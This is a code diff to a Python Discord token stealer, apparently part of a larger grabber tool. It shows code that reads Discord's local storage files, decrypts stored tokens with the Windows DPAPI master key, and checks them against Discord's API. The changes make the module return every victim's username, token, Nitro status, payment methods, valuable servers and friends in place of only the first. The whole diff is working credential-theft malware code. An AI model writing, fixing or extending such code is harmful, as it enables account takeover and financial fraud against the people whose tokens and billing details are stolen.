@@ -11,7 +11,8 @@ from win32crypt import CryptUnprotectData
 
 
 class DiscordToken:
-    def __init__(self) -> dict[str, Any]:
+    @classmethod
+    def run_module(cls) -> dict[str, Any]:
         return upload_tokens().get_data()
 
 
@@ -75,8 +76,10 @@ class extract_tokens:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for y in re.findall(self.regexp_enc, line):
-                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
-                                                     1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
+                            token = self.decrypt_val(
+                                base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), 
+                                self.get_master_key(self.roaming+f'\\{_discord}\\Local State')
+                            )
 
                             if self.validate_token(token):
                                 uid = requests.get(self.base_url, headers={
@@ -130,7 +133,7 @@ class extract_tokens:
 
         return decoded_pass
 
-    def get_master_key(self, path: str) -> str | None:
+    def get_master_key(self, path: str) -> bytes | None:
         if not os.path.exists(path):
             return None
 
@@ -225,7 +228,9 @@ class upload_tokens:
 
     def get_data(self) -> dict[str, Any]:
         if not self.tokens:
-            return
+            return {}
+        
+        res = {}
 
         for token in self.tokens:
             user = requests.get(
@@ -258,23 +263,17 @@ class upload_tokens:
             else:
                 nitro = 'None'
 
-            if billing:
-                payment_methods = []
+            payment_methods = []
 
-                for method in billing:
-                    if method['type'] == 1:
-                        payment_methods.append('credit_card')
+            for method in billing:
+                if method['type'] == 1:
+                    payment_methods.append('credit_card')
 
-                    elif method['type'] == 2:
-                        payment_methods.append("paypal")
+                elif method['type'] == 2:
+                    payment_methods.append("paypal")
 
-                    else:
-                        payment_methods.append('unknown')
-
-                payment_methods = ', '.join(payment_methods)
-
-            else:
-                payment_methods = None
+                else:
+                    payment_methods.append('unknown')
 
             hq_guilds = []
             for guild in guilds:
@@ -323,7 +322,7 @@ class upload_tokens:
 
                     hq_friends.append(data)
 
-            return {
+            res[token] = {
                 "username": username,
                 "user_id": user_id,
                 "token": token,
@@ -336,3 +335,5 @@ class upload_tokens:
                 "guild_data": hq_guilds,
                 "friend_data": hq_friends
             }
+        
+        return res
